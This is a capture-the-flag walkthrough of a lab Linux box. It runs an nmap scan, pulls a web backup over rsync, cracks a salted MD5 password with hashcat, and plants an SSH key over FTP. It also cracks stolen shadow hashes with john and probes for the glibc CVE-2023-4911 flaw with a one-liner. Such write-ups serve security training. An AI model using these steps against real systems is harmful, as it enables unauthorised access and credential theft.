# Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
- [Rsync](#im-trying-to-use-rsync)
- [Analysis](#analysis)
  - [PHP code](#php-code)
  - [Database](#database)
- [Hashcat goes brrr](#hashcat-goes-brrr)
- [Try to connect to machine](#try-to-connect-to-machine)
- [Privilege escallation](#privilege-escallation)

# Enumeration

## Nmap

I started with a standard namp scan.

```
➜  ~ nmap -Pn -p- -A -vvv --min-rate 1500 --max-rtt-timeout 1500ms 10.10.126.173
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 16:42 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:42
Completed Parallel DNS resolution of 1 host. at 16:42, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:42
Scanning 10.10.126.173 [65535 ports]
Discovered open port 21/tcp on 10.10.126.173
Discovered open port 22/tcp on 10.10.126.173
Discovered open port 80/tcp on 10.10.126.173
Discovered open port 873/tcp on 10.10.126.173
Completed Connect Scan at 16:42, 15.39s elapsed (65535 total ports)
Initiating Service scan at 16:42
Scanning 4 services on 10.10.126.173
Completed Service scan at 16:42, 6.08s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.126.173.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 1.75s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.26s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.00s elapsed
Nmap scan report for 10.10.126.173
Host is up, received user-set (0.039s latency).
Scanned at 2023-11-05 16:42:33 CET for 23s
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE REASON  VERSION
21/tcp  open  ftp     syn-ack vsftpd 3.0.5
22/tcp  open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 54:0f:46:dd:4d:d1:51:97:56:8e:c3:ec:2d:b5:3b:ed (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA51kzHPlKLXt7PJ+g+v/cTk5LBHTWSqxzMM1BORXhUBWJJC9JYGKudBjanGA1V5n4g4nd5q1QTQSngTHvje2Vs=
|   256 ae:8b:94:95:0f:02:fd:db:c9:50:9c:23:20:e9:e2:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICykLDyN7yCJQFxiaZYJdJREesLJf5m+1V0jnc57Ko/G
80/tcp  open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Login
873/tcp open  rsync   syn-ack (protocol version 31)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.02s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.01s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.03 seconds
```


We see that the rsync port is open.


# I'm trying to use rsync

```
➜  ~ rsync -av --list-only rsync://10.10.126.173/
httpd          	web backup
```
```
➜  ~ rsync -av --list-only rsync://10.10.126.173/httpd
receiving incremental file list
drwxr-xr-x          4,096 2023/04/20 21:50:04 .
drwxr-xr-x          4,096 2023/04/20 22:13:22 db
-rw-r--r--         12,288 2023/04/20 21:50:42 db/site.db
drwxr-xr-x          4,096 2023/04/20 21:50:50 migrate
drwxr-xr-x          4,096 2023/04/20 22:13:15 www
-rw-r--r--          1,722 2023/04/20 22:02:54 www/dashboard.php
-rw-r--r--          2,315 2023/04/20 22:09:10 www/index.php
-rw-r--r--            101 2023/04/20 22:03:08 www/logout.php
```
the backup is stored on the server, we can try to use this sensitive data for our purposes and we can download these files to start analysis

```
rsync -Wav  rsync://10.10.126.173/httpd/ /home/qrxnz/Documents
```
# Analysis

## Tree of downloaded files

```
.
├── db
│   └── site.db
├── migrate
└── www
    ├── dashboard.php
    ├── index.php
    └── logout.php
```

## PHP code

```php
<?php
session_start();
$secure = "6c4972f3717a5e881e282ad3105de01e";

if (isset($_SESSION['username'])) {
    header('Location: dashboard.php');
    exit();
}

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $hash = md5("$secure|$username|$password");
    $db = new SQLite3('../db/site.db');
    $result = $db->query("SELECT * FROM users WHERE username = '$username' AND password= '$hash'");
    $row = $result->fetchArray(SQLITE3_ASSOC);
    if ($row) {
        $_SESSION['username'] = $row['username'];
        header('Location: dashboard.php');
        exit();
    } else {
        $error_message = 'Invalid username or password.';
    }
}
```

## Database

```
➜  db sqlite3 site.db
SQLite version 3.43.2 2023-10-10 12:14:04
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|admin|7658a2741c9df3a97c819584db6e6b3c
2|triss|a0de4d7f81676c3ea9eabcadfd2536f6
sqlite>
```

Now we have the salt and hash of the password, we can try to crack them.

# Hashcat goes brrr

```bash
hashcat -a 7 -m 0 a0de4d7f81676c3ea9eabcadfd2536f6 '6c4972f3717a5e881e282ad3105de01e|triss|' /usr/share/wordlists/rockyou.txt
```
```
a0de4d7f81676c3ea9eabcadfd2536f6:6c4972f3717a5e881e282ad3105de01e|triss|gerald
```

We found the password!

# Try to connect to machine

we can't login to ssh using password but we can login to FTP.

```
➜  ~ ftp triss@10.10.126.173
Connected to 10.10.126.173.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

yay!

```
ftp> ls -al
229 Entering Extended Passive Mode (|||29189|)
150 Here comes the directory listing.
drwxr-x---    4 1003     1003         4096 Nov 05 12:55 .
drwxr-x---    4 1003     1003         4096 Nov 05 12:55 ..
lrwxrwxrwx    1 0        0               9 Apr 21  2023 .bash_history -> /dev/null
-rw-r--r--    1 1003     1003          220 Apr 19  2023 .bash_logout
-rw-r--r--    1 1003     1003         3771 Apr 19  2023 .bashrc
drwx------    2 1003     1003         4096 Nov 05 12:47 .cache
-rw-r--r--    1 1003     1003          807 Apr 19  2023 .profile
```
```
ftp> ls
229 Entering Extended Passive Mode (|||59618|)
150 Here comes the directory listing.
-rw-------    1 1003     1003          564 Nov 05 12:35 authorized_keys
-rw-------    1 1003     1003          564 Nov 05 12:35 id_rsa.pub
226 Directory send OK.
```

As we can see, we gain access to the home directory via FTP, which allows us to upload our ssh keys.

```
➜  ~ ssh triss@10.10.126.173
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1023-aws x86_64
```

We connected!

# I'm trying to do something :P

```
triss@ip-10-10-200-238:~$ ls -al /

total 76
drwxr-xr-x  20 root root  4096 Nov  5 12:23 .
drwxr-xr-x  20 root root  4096 Nov  5 12:23 ..
drwxr-xr-x   2 root root  4096 Nov  5 12:48 backup
lrwxrwxrwx   1 root root     7 Mar 25  2023 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Apr 19  2023 boot
drwxr-xr-x  15 root root  3180 Nov  5 12:23 dev
drwxr-xr-x  96 root root  4096 Nov  5 12:23 etc
drwxr-xr-x   7 root root  4096 Apr 19  2023 home
lrwxrwxrwx   1 root root     7 Mar 25  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Mar 25  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Mar 25  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Mar 25  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Mar 25  2023 lost+found
drwxr-xr-x   2 root root  4096 Mar 25  2023 media
drwxr-xr-x   2 root root  4096 Mar 25  2023 mnt
drwxr-xr-x   3 root root  4096 Apr 19  2023 opt
dr-xr-xr-x 163 root root     0 Nov  5 12:23 proc
drwx------   6 root root  4096 Apr 21  2023 root
drwxr-xr-x  27 root root   880 Nov  5 12:47 run
lrwxrwxrwx   1 root root     8 Mar 25  2023 sbin -> usr/sbin
drwxr-xr-x   8 root root  4096 Mar 25  2023 snap
drwxr-xr-x   3 root root  4096 Apr 19  2023 srv
dr-xr-xr-x  13 root root     0 Nov  5 12:23 sys
drwxrwxrwt  12 root root  4096 Nov  5 12:48 tmp
drwxr-xr-x  14 root root  4096 Mar 25  2023 usr
drwxr-xr-x  14 root root  4096 Apr 20  2023 var
```
```
drwxr-xr-x   2 root root  4096 Nov  5 12:48 backup
```
```
triss@ip-10-10-200-238:/backup$ ls
1699187041.zip  1699187281.zip  1699187521.zip  1699187761.zip  1699188001.zip  1699188241.zip  1699188481.zip  1699188721.zip
1699187161.zip  1699187401.zip  1699187641.zip  1699187881.zip  1699188121.zip  1699188361.zip  1699188601.zip
```
We found a versioned backup on the server, we can download the latest one via FTP.

```bash
triss@ip-10-10-200-238:/backup$ cp 1699188841.zip ~/
```
```
ftp> get 1699188841.zip
local: 1699188841.zip remote: 1699188841.zip
229 Entering Extended Passive Mode (|||48813|)
150 Opening BINARY mode data connection for 1699188841.zip (5899 bytes).
100% |*********************************************************************************************************************************************************************************************|  5899        1.42 MiB/s    00:00 ETA
226 Transfer complete.
5899 bytes received in 00:00 (76.81 KiB/s)
```
```
Archive:  1699188841.zip
   creating: tmp/backup/
  inflating: tmp/backup/rsyncd.conf
   creating: tmp/backup/httpd/
   creating: tmp/backup/httpd/www/
  inflating: tmp/backup/httpd/www/dashboard.php
  inflating: tmp/backup/httpd/www/logout.php
  inflating: tmp/backup/httpd/www/index.php
   creating: tmp/backup/httpd/migrate/
   creating: tmp/backup/httpd/db/
  inflating: tmp/backup/httpd/db/site.db
  inflating: tmp/backup/passwd
  inflating: tmp/backup/shadow
```
```
  inflating: tmp/backup/passwd
  inflating: tmp/backup/shadow
```
This way we can crack other users' passwords!

# Try to crack passwords

Now we need to prepare passwords for cracking.

```
➜  backup pwd
/home/qrxnz/tmp/backup
➜  backup ls -al
total 24
drwxr-xr-x 3 qrxnz qrxnz 4096 Nov  5 13:54 .
drwxr-xr-x 3 qrxnz qrxnz 4096 Nov  5 14:01 ..
drwxr-xr-x 5 qrxnz qrxnz 4096 Nov  5 13:54 httpd
-rw-r--r-- 1 qrxnz qrxnz 2131 Nov  5 13:54 passwd
-rw-r--r-- 1 qrxnz qrxnz  430 Nov  5 13:54 rsyncd.conf
-rw-r----- 1 qrxnz qrxnz 1487 Nov  5 13:54 shadow
➜  backup unshadow passwd shadow > unshadow.txt
```

## Try to crack

```
➜  backup john --format=crypt unshadow.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sakura           (sa)
gerald           (jennifer)
gerald           (triss)
3g 0:00:00:49 0.01% (ETA: 2023-11-12 04:48) 0.06012g/s 28.85p/s 92.34c/s 92.34C/s rachelle..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

We get passwords, we can switch user account!

```
jennifer@ip-10-10-200-238:~$ ls
user.txt
```
We found a user flag on Jennifer's account

# Privilege escallation

I tried to exploit glibc :D

```bash
jennifer@ip-10-10-200-238:~$ env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
```
```
Segmentation fault (core dumped)
```

As we can see, glibc is vulnerable!

Currently, we can use any exploit for cve-2023-4911 to gain root access!
